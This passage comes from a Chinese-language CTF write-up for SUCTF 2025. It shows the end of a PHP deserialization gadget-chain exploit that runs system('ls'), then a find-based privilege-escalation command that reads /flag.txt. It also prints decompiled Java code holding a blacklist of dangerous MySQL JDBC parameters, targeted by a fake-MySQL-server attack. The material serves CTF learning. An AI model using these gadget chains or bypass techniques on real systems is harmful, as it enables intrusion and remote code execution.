</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_behaviors</span><span class=o>=</span><span class=k>new</span> <span class=nx>BehaviorRegistry</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ObjectRegistry</span><span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>BehaviorRegistry</span> <span class=k>extends</span> <span class=nx>ObjectRegistry</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=k>array</span> <span class=nv>$_methodMap</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=k>array</span> <span class=nv>$_loaded</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_methodMap</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;rewind&#34;</span><span class=o>=&gt;</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;wi&#34;</span><span class=p>,</span><span class=s2>&#34;generate&#34;</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_loaded</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;wi&#34;</span><span class=o>=&gt;</span><span class=k>new</span> <span class=nx>MockClass</span><span class=p>()];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>PHPUnit\Framework\MockObject\Generator</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=k>function</span> <span class=nf>call_user_func</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=k>function</span> <span class=nf>class_exists</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>final</span> <span class=k>class</span> <span class=nc>MockClass</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nx>readonly</span> <span class=nx>string</span> <span class=nv>$classCode</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nx>readonly</span> <span class=nx>string</span> <span class=nv>$mockName</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=c1>// $this-&gt;classCode = &#34;phpinfo();&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>classCode</span> <span class=o>=</span> <span class=s2>&#34;system(&#39;ls&#39;);&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mockName</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>React\Promise\Internal</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>RejectedPromise</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>终于成功了，太难了这一路走来，然后提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>find . -exec cat /flag.txt \; -quit
</span></span></code></pre></td></tr></table></div></div><p>但是写着写着就忘了为啥要写<code>rewind</code>呢，其实仔细回看，在<code>__toString()</code>里面触发了这个方法，所以下图的参数也是<code>rewind</code></p><p><img src=/p/suctf2025/QQ20250114-185217.jpg width=831 height=468 srcset="/p/suctf2025/QQ20250114-185217_hu_b8a02ca505c12679.jpg 480w, /p/suctf2025/QQ20250114-185217_hu_6e17281f63d20e84.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=177 data-flex-basis=426px></p><p>那么call里面的代码解析看看就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_loaded</span><span class=p>[</span><span class=nv>$behavior</span><span class=p>]</span><span class=o>-&gt;</span><span class=p>{</span><span class=nv>$callMethod</span><span class=p>}(</span><span class=o>...</span><span class=nv>$args</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这里是触发<code>$behavior</code>中的<code>$callMethod</code>方法，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>[</span><span class=nv>$behavior</span><span class=p>,</span> <span class=nv>$callMethod</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>_methodMap</span><span class=p>[</span><span class=nv>$method</span><span class=p>];</span>
</span></span></code></pre></td></tr></table></div></div><p>进行依次赋值，将<code>[0]</code>赋值给<code>$behavior</code>将<code>[1]</code>赋值给<code>$callMethod</code>，也就对了</p><p><img src=/p/suctf2025/QQ20250114-185906.jpg width=1855 height=788 srcset="/p/suctf2025/QQ20250114-185906_hu_504bb1e1a45997b3.jpg 480w, /p/suctf2025/QQ20250114-185906_hu_29f517ca5631b53a.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=235 data-flex-basis=564px></p><h2 id=su_sujava>SU_sujava</h2><p>进来看到好像是一个黑盒一样的东西，搜索hint发现一个漏洞<a class=link href=https://forum.butian.net/share/2848 target=_blank rel=noopener>fakeMysqlServer</a></p><p>把附件下载下来，然后看代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.pho3n1x.sujava.security</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.UnsupportedEncodingException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.URLDecoder</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Iterator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Map</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.regex.Matcher</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.regex.Pattern</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.stream.Collectors</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.lang3.StringUtils</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: SecurityChecker.class */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>SecurityChecker</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=cm>/* renamed from: checklist = &#34;allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#&#34;;
</span></span></span><span class=line><span class=cl><span class=cm>	public static void checkJdbcConnParams(String host, Integer port, String username, String password, String database, Map&lt;String, Object&gt; extraParams) throws Exception {
</span></span></span><span class=line><span class=cl><span class=cm>		if (!host.trim().matches(&#34;^[a-zA-Z0-9.-]+$&#34;) || !database.matches(&#34;^[a-zA-Z0-9_]+$&#34;) || parseParamsMapToMysqlParamUrl(extraParams).matches(&#34;.*(allowLoadLocalInfile|autoDeserialize|allowLocalInfile|allowUrlInLocalInfile|#|%).*&#34;)) {
</span></span></span><span class=line><span class=cl><span class=cm>			throw new Exception(&#34;Invalid mysql connection params.&#34;);
</span></span></span><span class=line><span class=cl><span class=cm>		}
</span></span></span><span class=line><span class=cl><span class=cm>	}, reason: not valid java name and contains not printable characters */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>f0x2356168a</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>AND_SYMBOL</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&amp;&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>EQUAL_SIGN</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;=&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>COMMA</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;,&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>BLACKLIST_REGEX</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;autodeserialize|allowloadlocalinfile|allowurlinlocalinfile|allowloadlocalinfileinpath&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>MYSQL_SECURITY_CHECK_ENABLE</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;true&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>MYSQL_CONNECT_URL</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;jdbc:mysql://%s:%s/%s&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>JDBC_MYSQL_PROTOCOL</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;jdbc:mysql&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>JDBC_MATCH_REGEX</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>MYSQL_SENSITIVE_PARAMS</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;allowLoadLocalInfile,autoDeserialize,allowLocalInfile,allowUrlInLocalInfile,#&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>checkJdbcConnParams</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>Integer</span><span class=w> </span><span class=n>num</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str3</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str4</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>map</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Boolean</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>MYSQL_SECURITY_CHECK_ENABLE</span><span class=p>).</span><span class=na>booleanValue</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isAnyBlank</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>CharSequence</span><span class=o>[]</span><span class=p>{</span><span class=n>str</span><span class=p>,</span><span class=w> </span><span class=n>str2</span><span class=p>}))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;Invalid mysql connection params.&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>format</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>MYSQL_CONNECT_URL</span><span class=p>,</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>trim</span><span class=p>(),</span><span class=w> </span><span class=n>num</span><span class=p>,</span><span class=w> </span><span class=n>str4</span><span class=p>.</span><span class=na>trim</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>checkHost</span><span class=p>(</span><span class=n>str</span><span class=p>.</span><span class=na>trim</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>checkUrl</span><span class=p>(</span><span class=n>format</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>checkParams</span><span class=p>(</span><span class=n>map</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>checkUrlIsSafe</span><span class=p>(</span><span class=n>format</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>checkHost</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>str</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>str</span><span class=p>.</span><span class=na>startsWith</span><span class=p>(</span><span class=s>&#34;(&#34;</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>endsWith</span><span class=p>(</span><span class=s>&#34;)&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>(</span><span class=s>&#34;Invalid host&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>checkUrl</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>str</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>startsWith</span><span class=p>(</span><span class=n>JDBC_MYSQL_PROTOCOL</span><span class=p>))</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>Pattern</span><span class=p>.</span><span class=na>compile</span><span class=p>(</span><span class=n>JDBC_MATCH_REGEX</span><span class=p>).</span><span class=na>matcher</span><span class=p>(</span><span class=n>str</span><span class=p>).</span><span class=na>matches</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Exception</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=nf>parseMysqlUrlParamsToMap</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isBlank</span><span class=p>(</span><span class=n>str</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>split</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>str</span><span class=p>.</span><span class=na>split</span><span class=p>(</span><span class=n>AND_SYMBOL</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>(</span><span class=n>split</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str2</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>split</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>split2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>str2</span><span class=p>.</span><span class=na>split</span><span class=p>(</span><span class=n>EQUAL_SIGN</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>split2</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>split2</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>split2</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>hashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>parseParamsMapToMysqlParamUrl</span><span class=p>(</span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>map</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>map</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>map</span><span class=p>.</span><span class=na>isEmpty</span><span class=p>())</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=p>(</span><span class=n>String</span><span class=p>)</span><span class=w> </span><span class=n>map</span><span class=p>.</span><span class=na>entrySet</span><span class=p>().</span><span class=na>stream</span><span class=p>().</span><span class=na>map</span><span class=p>(</span><span class=n>entry</span><span class=w> </span><span class=o>-&gt;</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>join</span><span class=p>(</span><span class=n>EQUAL_SIGN</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>CharSequence</span><span class=p>)</span><span class=w> </span><span class=n>entry</span><span class=p>.</span><span class=na>getKey</span><span class=p>(),</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>valueOf</span><span class=p>(</span><span class=n>entry</span><span class=p>.</span><span class=na>getValue</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}).</span><span class=na>collect</span><span class=p>(</span><span class=n>Collectors</span><span class=p>.</span><span class=na>joining</span><span class=p>(</span><span class=n>AND_SYMBOL</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
